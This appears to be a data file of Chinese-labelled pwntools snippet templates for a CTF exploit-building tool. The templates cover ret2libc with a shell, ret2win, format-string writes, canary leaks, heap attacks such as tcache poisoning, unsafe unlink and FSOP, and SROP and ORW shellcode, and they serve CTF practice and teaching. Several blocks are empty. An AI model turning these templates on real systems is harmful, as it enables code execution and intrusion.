blocks.title: 本地/远程切换
blocks.description: 使用 args.REMOTE 在 process 和 remote 之间切换。

blocks.title: 远程连接
blocks.description: 只生成 remote 连接片段。
blocks.snippet: p = remote('{{HOST}}', {{PORT}})

blocks.title: 本地 process
blocks.description: 只生成本地 process 连接片段。
blocks.snippet: p = process('{{BINARY_PATH}}')

blocks.title: ELF + libc 加载
blocks.description: 加载目标 ELF 和指定 libc。
blocks.snippet:
elf = ELF('{{BINARY_PATH}}')
libc = ELF('{{LIBC_PATH}}')

blocks.title: 常用符号引用
blocks.description: GOT/PLT/symbols 常用写法。
blocks.snippet:
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_addr = elf.symbols['main']

blocks.title: cyclic 偏移
blocks.description: 生成 cyclic 和 cyclic_find 辅助片段。
blocks.snippet:
pattern = cyclic({{PATTERN_LEN}})
offset = cyclic_find({{CRASH_VALUE}})
log.info(f'offset = {offset}')

blocks.title: ret2win
blocks.description: 最小 ret2win payload 模板，含栈对齐 ret。
blocks.snippet:
offset = {{OFFSET}}
ret = {{RET_GADGET}}
win = elf.symbols['{{WIN_SYMBOL}}']

payload  = b'A' * offset
payload += p64(ret)          # 64 位栈对齐
payload += p64(win)
p.sendline(payload)

blocks.title: ret2syscall
blocks.description: 通过 syscall gadget 构造 execve('/bin/sh', 0, 0) 链；gadget 和地址必须按目标文件确认。

blocks.title: ret2libc 两阶段
blocks.description: 泄漏 puts 地址后回 main，再调用 system('/bin/sh')。
blocks.snippet:
offset = {{OFFSET}}
rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

payload  = b'A' * offset
payload += p64(pop_rdi) + p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(elf.symbols['main'])
p.sendlineafter(b'{{PROMPT}}', payload)
leak = u64(p.recvline().strip().ljust(8, b'\x00'))
libc.address = leak - libc.symbols['puts']
log.success(f'libc = {hex(libc.address)}')

bin_sh = next(libc.search(b'/bin/sh'))
system = libc.symbols['system']
payload  = b'A' * offset
payload += p64(ret)
payload += p64(pop_rdi) + p64(bin_sh)
payload += p64(system)
p.sendlineafter(b'{{PROMPT}}', payload)
p.interactive()

blocks.title: 手动 gadget 占位
blocks.description: 手动填写 pop rdi / ret 等 gadget 地址。
blocks.snippet:

blocks.title: 格式化字符串泄漏
blocks.description: 只生成 %p 泄漏 payload；发送位置按题目手动接入。
blocks.snippet:
payload = b'%{{START}}$p.%{{NEXT}}$p.%{{NEXT2}}$p'
# 按题目输入点发送，例如：io.sendlineafter(b'> ', payload)

blocks.title: fmtstr_payload 写入
blocks.description: pwntools fmtstr_payload 任意写片段；只构造 payload。
blocks.snippet:
# 高阶备用：只构造 payload，不固定发送点。
payload = fmtstr_payload(
    {{OFFSET}},
    { {{TARGET_ADDR}}: {{TARGET_VALUE}} },
    write_size='{{WRITE_SIZE}}'
)
# 按题目输入点发送，例如：io.sendlineafter(b'> ', payload)

blocks.title: p64 打包
blocks.description: 把整数地址打包成 64 位小端 bytes。
blocks.snippet:

blocks.title: u64 解析泄漏
blocks.description: 把不足 8 字节的泄漏补齐后转整数。
blocks.snippet:

log.success(hex(leak))

blocks.title: 手动 payload 拼接
blocks.description: 不用 flat 的 payload 拼接骨架。
blocks.snippet:
# 少用 flat 的手动 payload 拼接写法；复杂洞再改回 flat 也行。
payload  = b'A' * {{OFFSET}}
payload += p64({{ADDR1}})
payload += p64({{ADDR2}})

blocks.title: i386 WSL 调试头部
blocks.description: 你常用的 32 位 pwntools 头部，适配 Windows 调 WSL bash。
blocks.snippet:
from pwn import*

context(arch='i386',os='linux',log_level='debug')
context.terminal=['cmd.exe','/c','wsl.exe','bash','-c']

blocks.title: 自定义 base64 表
blocks.description: 自定义 base64 字母表的字符串和数字编码函数。

blocks.title: 沙箱 ORW shellcode
blocks.description: 常见 seccomp 只放行 open/read/write 时的 ORW shellcode 文本。
blocks.snippet:
shellcode = shellcraft.open('{{FLAG_PATH}}')
shellcode += shellcraft.read('rax', 'rsp', 0x100)
shellcode += shellcraft.write(1, 'rsp', 0x100)
payload = asm(shellcode)
io.send(payload)

blocks.title: fmt offset 探测
blocks.description: 构造 AAAA + 多个 %p 的 offset 探测 payload；发送位置手动接入。
blocks.snippet:
payload = b'AAAA.' + b'.'.join([f'%{i}$p'.encode() for i in range({{START}}, {{END}})])
# 按题目输入点发送 payload，再观察回显定位 AAAA/0x41414141。

blocks.description: 生成 /bin/sh shellcode 文本，不在工具内执行。

blocks.title: i386 泄漏解析
blocks.description: 32 位地址泄漏解析，适合 recv 4 字节或行尾截取。
blocks.snippet:

blocks.title: canary 泄漏模板
blocks.description: 用格式化字符串泄漏 canary 后拼回 payload。
blocks.snippet:
p.sendline(b'%{{CANARY_POS}}$p')
canary = int(p.recvline().strip(), 16)
log.success(f'canary = {hex(canary)}')

payload  = b'A' * {{PADDING_LEN}}
payload += p64(canary)
payload += b'B' * {{SAVED_REG_LEN}}
payload += p64({{RETURN_ADDR}})

blocks.title: tcache poisoning 骨架
blocks.description: 菜单堆题常见 double free / tcache poisoning 代码形状。
blocks.snippet:
# 需要按题目菜单改 add/delete/edit/show
size = {{REQUEST_SIZE}}
target = {{TARGET_ADDR}}
value = {{WRITE_VALUE}}

add(size, b'A')
add(size, b'B')
delete({{CHUNK_A_INDEX}})
delete({{CHUNK_B_INDEX}})
delete({{CHUNK_A_INDEX}})
add(size, p64(target))
add(size, b'C')
add(size, b'D')
add(size, p64(value))

blocks.title: ret2dlresolve 提纲
blocks.description: 没有 libc 泄漏时的 ret2dlresolve pwntools 写法提纲。
blocks.snippet:
dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])
rop = ROP(elf)
rop.read(0, dlresolve.data_addr, len(dlresolve.payload))
rop.ret2dlresolve(dlresolve)
payload = b'A' * {{OFFSET}} + rop.chain()
p.sendline(payload)
p.sendline(dlresolve.payload)

blocks.title: unsorted bin libc 泄漏
blocks.description: glibc 2.23-2.31 常见 unsorted bin 泄漏 main_arena 指针模板。
blocks.snippet:
add(0x500, b'A')
add(0x20, b'guard')
delete(0)
show(0)
leak = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
main_arena_offset = {{MAIN_ARENA_OFFSET}}
libc.address = leak - main_arena_offset
log.success(f'libc = {hex(libc.address)}')

blocks.title: unsafe unlink 模板
blocks.description: glibc 2.23 常见 unsafe unlink，伪造 fd/bk 指向指针数组附近。
blocks.snippet:
ptr = {{PTR_ARRAY_ADDR}}
fake  = p64(0) + p64(0x91)
fake += p64(ptr - 0x18)
fake += p64(ptr - 0x10)
fake  = fake.ljust(0x80, b'A')
fake += p64(0x90) + p64(0xa0)
edit({{CHUNK_A_INDEX}}, fake)
delete({{CHUNK_B_INDEX}})

blocks.title: FSOP stdout 泄漏
blocks.description: 覆盖 stdout flags/_IO_write_base 等字段制造 libc 泄漏。
blocks.snippet:

payload = p64(0xfbad1800)
payload += p64(0) * 3
payload += p8(0x00)
edit({{CHUNK_A_INDEX}}, payload)
leak = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
log.success(f'leak = {hex(leak)}')

blocks.title: 纯 ROP ORW
blocks.description: 无 execve 时通过 open/read/write 读取 flag。

rop.call({{OPEN}}, [{{FLAG_ADDR}}, 0])
rop.call({{READ}}, [3, {{BUF_ADDR}}, 0x100])
rop.call({{WRITE}}, [1, {{BUF_ADDR}}, 0x100])

blocks.title: SROP SigreturnFrame
blocks.description: 使用 sigreturn 控制完整寄存器集合。
blocks.snippet:

frame.rax = 59
frame.rdi = {{BINSH_ADDR}}
frame.rsi = 0
frame.rdx = 0
frame.rip = {{SYSCALL_GADGET}}
payload = flat({{OFFSET}}, {{POP_RAX}}, 15, {{SYSCALL_GADGET}}, bytes(frame))
